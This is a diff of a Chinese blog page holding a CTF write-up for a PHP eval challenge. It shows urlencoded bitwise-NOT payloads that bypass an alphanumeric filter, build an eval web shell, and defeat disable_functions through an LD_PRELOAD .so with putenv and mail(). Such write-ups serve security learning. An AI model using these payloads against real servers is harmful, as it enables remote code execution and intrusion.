@@ -13,10 +13,15 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="首先老样子一来就是源码 1234567891011121314151617&lt;?phperror_reporting(0);if(isset($_GET[&amp;#x27;code&amp;#x27;]))&amp;#123;            $code&#x3D;$_GET[&amp;#x27;code&amp;#x27;];                    if(strlen($code)&gt;40)&amp;#123;">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/109.PNG?raw=true">
+<meta property="og:image" content="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/110.PNG?raw=true">
+<meta property="og:image" content="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/bbbb.PNG?raw=true">
+<meta property="og:image" content="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/bbbbb.PNG?raw=true">
 <meta property="article:published_time" content="2021-07-29T06:23:35.000Z">
-<meta property="article:modified_time" content="2021-07-29T07:43:23.219Z">
+<meta property="article:modified_time" content="2021-07-29T10:34:41.746Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/109.PNG?raw=true">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -98,16 +103,22 @@
         <p>首先老样子一来就是源码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">            $code=$_GET[&#x27;code&#x27;];</span><br><span class="line">                    if(strlen($code)&gt;40)&#123;</span><br><span class="line">                                        die(&quot;This is too Long.&quot;);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;</span><br><span class="line">                                        die(&quot;NO.&quot;);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @eval($code);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">            highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// ?&gt;</span><br></pre></td></tr></table></figure>
 
-<p>这边需要绕过正则表达式而且有长度限制<strong>可以直接使用取反urlencode编码绕过</strong><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/104631142">https://blog.csdn.net/mochu7777777/article/details/104631142</a>  各种绕过方法<br>先phpinfo看一下禁止了哪些功能  </p>
+<p>这边需要绕过正则表达式而且有长度限制<strong>可以直接使用取反urlencode编码绕过</strong></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/104631142">https://blog.csdn.net/mochu7777777/article/details/104631142</a>  这位大佬介绍了各种绕过方法<br>先phpinfo看一下禁止了哪些功能  </p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   echo urlencode(~&#x27;phpinfo&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 <p><strong>payload: ?code=(~%8F%97%8F%96%91%99%90)();</strong></p>
-<p>禁用了一堆的功能<br>构造shell连接</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/109.PNG?raw=true" alt="109.PNG"></p>
+<p>构造shell连接</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   $a=&#x27;assert&#x27;;</span><br><span class="line">   $b=urlencode(~$a);</span><br><span class="line">   echo $b;</span><br><span class="line">   echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">   $c=&#x27;(eval($_POST[aaa]))&#x27;;</span><br><span class="line">   $d=urlencode(~$c);</span><br><span class="line">   echo $d;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
+<p>禁用了一堆的功能</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/110.PNG?raw=true" alt="110.PNG"></p>
 <p><strong>可以连接但是只能从readflag里面拿到flag  flag是空的</strong></p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/bbbb.PNG?raw=true" alt="bbbb.PNG"></p>
 <p>可以用<strong>蚂剑的绕过disabled_function插件选择PHP_GC_UAF就可以运行那个readflag</strong> （这是非预期解法）</p>
-<p><strong>预期解</strong>通过Linux提供的LD_preload+mail劫持so来执行系统命令 在启动子进程使新的子进程会加载恶意的so拓展然后<br>我们可以通过so里面定义同名函数劫持api调用<br>这边disable_functions 禁用了system<br>找到了大佬写好的文件 <a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a><br>可以用先将bupass_disablefunc_x64.so用蚁剑传入<br>在传入这个脚本</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/bbbbb.PNG?raw=true" alt="bbbbb.PNG"></p>
+<p><strong>预期解</strong>通过Linux提供的<strong>LD_preload+mail劫持so来执行系统命令</strong> 在启动子进程使新的子进程会加载恶意的so拓展然后<br>我们可以通过so里面定义同名函数劫持api调用<br>这边disable_functions 禁用了system<br>找到了大佬写好的文件 <a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a><br>可以用先将bupass_disablefunc_x64.so用蚁剑传入<br>在传入这个脚本</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// exp.php</span><br><span class="line">$cmd = &quot;/readflag&quot;;</span><br><span class="line">$out_path = &quot;/tmp/1.txt&quot;;</span><br><span class="line">$evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;</span><br><span class="line">putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);</span><br><span class="line">$so_path = &quot;/tmp/bypass_disablefunc_x64.so&quot;;</span><br><span class="line">putenv(&quot;LD_PRELOAD=&quot; . $so_path);</span><br><span class="line">mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);</span><br><span class="line">echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;;</span><br><span class="line">unlink($out_path);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>最终步骤：</p>
@@ -177,6 +188,14 @@
       <ul>
         
           <li>
+            <a href="/2021/07/29/page-90/">buuctf  misc zip</a>
+          </li>
+        
+          <li>
+            <a href="/2021/07/29/page-89/">misc2</a>
+          </li>
+        
+          <li>
             <a href="/2021/07/29/page-88/">羊城杯 2020逃离东南亚</a>
           </li>
         
@@ -186,14 +205,6 @@
         
           <li>
             <a href="/2021/07/29/page-86/">CISCN2019 华北赛区 Day1 Web1Dropbox</a>
-          </li>
-        
-          <li>
-            <a href="/2021/07/29/page-85/">极客大挑战 2019RCE ME</a>
-          </li>
-        
-          <li>
-            <a href="/2021/07/29/page-84/">CISCN2019 华北赛区 Day1 Web2ikun</a>
           </li>
         
       </ul>
